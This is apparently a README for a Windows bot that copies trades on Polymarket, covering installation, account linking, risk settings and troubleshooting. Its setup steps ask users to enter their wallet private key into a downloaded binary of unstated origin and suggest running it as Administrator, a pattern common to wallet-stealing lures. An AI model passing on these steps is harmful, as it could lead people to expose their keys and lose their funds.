## 🎯 About the software

The polymarket-copy-trading-bot helps you copy trade movements on the Polymarket platform. You can mirror the actions of specific accounts or market strategies. The bot runs on your Windows computer to manage trades without manual input. It works by monitoring market positions and placing similar orders in your account.

This tool aims to save time for traders who want to follow market trends. It connects to your wallet to place trades. The bot updates your positions in real-time.

## ⚙️ System requirements

Ensure your computer meets these standards to run the software.

*   Operating System: Windows 10 or Windows 11.
*   Processor: Intel Core i3 or equivalent.
*   Memory: 4 GB RAM.
*   Storage: 200 MB of free disk space.
*   Internet: Stable connection for live trade monitoring.

## 🚀 Setting up the bot

Follow these steps to prepare the bot for your first trade.

1. Locate the downloaded file in your Downloads folder.
2. Double-click the file to open the installation wizard.
3. Follow the prompts on your screen.
4. Click Finish when the installation ends.
5. Create a folder on your desktop for configuration files.
6. Launch the bot using the icon on your desktop.

## 🔑 Linking your account

The bot needs access to your Polymarket account to trade. 

1. Open the bot settings menu.
2. Select the API Connection tab.
3. Paste your public wallet address into the required box.
4. Add your personal private key. Keep this key safe. Do not share it with anyone.
5. Click Save to apply your details.

## 📈 Monitoring your trades

Once connected, the bot provides a dashboard to watch your activity.

*   Status light: A green dot shows the bot is active. A red dot shows a connection error.
*   History tab: This section lists all past trades.
*   Active orders: See pending trades here.
*   Balance check: See your current account value at the top of the window.

## 🛡️ Managing safety and risk

Trading involves risk. This bot executes trades based on rules you set.

*   Set your entry limits: Tell the bot the maximum amount to spend on one trade.
*   Use stop-loss: Tell the bot when to exit a losing position.
*   Start small: Test the bot with a small amount of money before you increase your stakes.
*   Check settings often: Trends change. Review your strategy every time you open the program.

## ❓ Troubleshooting common issues

If the bot stops working, try these solutions.

*   Connection error: Check your internet status. Restart your router if needed.
*   Trade failed: Verify your wallet balance. You must have enough funds for both the trade and the network gas fee.
*   Low performance: Close extra browser tabs or heavy programs while the bot runs.
*   Blank screen: Right-click the icon and choose "Run as Administrator."

## 🔧 Updating the bot

Software updates keep your bot secure and efficient.

1. Open the bot application.
2. Go to the Help menu.
3. Click Check for Updates.
4. If a new version exists, the bot will download it.
5. Restart the program to finish the update process.
